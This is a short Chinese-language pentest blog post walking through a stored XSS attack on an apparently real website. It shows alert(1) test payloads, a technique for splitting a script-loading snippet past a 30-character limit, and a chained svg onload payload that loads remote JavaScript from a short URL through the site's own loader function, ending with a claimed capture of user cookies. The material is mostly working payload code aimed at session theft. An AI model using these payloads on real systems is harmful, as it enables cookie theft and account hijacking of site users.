+++
date = "2016-07-17T23:30:54+08:00"
description = ""
draft = false
tags = ["xss"]
title = "XSS实例"
topics = ["Pentest"]

+++

首先感谢凯神的指导。。。
### 0x00 注册账号
> 先得到一个临时邮箱，然后注册账号
{{% fluid_img src="/img/post/xss_example_get_temporary_email.png" alt="xss实例申请临时邮箱" %}}
<br /><br />
{{% fluid_img src="/img/post/xss_example_register.png" alt="xss实例注册账号" %}}

### 0x01 找输入输出点
> {{% fluid_img src="/img/post/xss_example_add_topic.png" alt="xss实例添加关注" %}}
<br /><br />
{{% fluid_img src="/img/post/xss_example_input_output_point.png" alt="xss实例输入输出点" %}}

### 0x02 尝试构造payload
> payload用如下的即可：
```
<script>alert(1)</script>
"><script>alert(1)</script><a
```
但是这个要在点击删除时payload才起作用
{{% fluid_img src="/img/post/xss_example_payload_test.png" alt="xss实例payload test" %}}
```
也可用<img src=1 onerror=alert(1) />自动加载，但也要点击删除按钮才能起作用  
但是我们若想充分利用则需要远程加载自己的js
```

### 0x03 加载自己的js
* 此时的限制条件为：

> ```
* 30个字符
* script标签不能自己触发
```

* 只能构造类似下面的语句自己加载脚本：

> ```
a=document.createElement('script');
a.src="www.xxx.com";
document.head.appendChild(a);
```

* 可以用如下方法分割，多次添加：

> ```
a=document.createE/*
*/lement('script');/*
*/a.src="www.xxx.com";/*
*/document.head.app/*
*/endChild(a);

但此处不可行，考虑直接用JQuery等的函数getScript(URL)直接加载url，然而此处依然不行
```

* 查找
{{% fluid_img src="/img/post/xss_example_find_loadjs.png" alt="xss实例发现网站自己的加载js的函数" %}}

* 构造payload
{{% fluid_img src="/img/post/xss_example_short_url.png" alt="xss实例使用js短网址" %}}

> ```
使用如下payload：
<svg/onload="b='http://t.i'">
<svg/onload="b+='m/16ap6'">
<svg/onload="$loadJs(b)">
```

### 0x04 得到Cookie
> {{% fluid_img src="/img/post/xss_example_get_cookie.png" alt="xss实例得到Cookie" %}}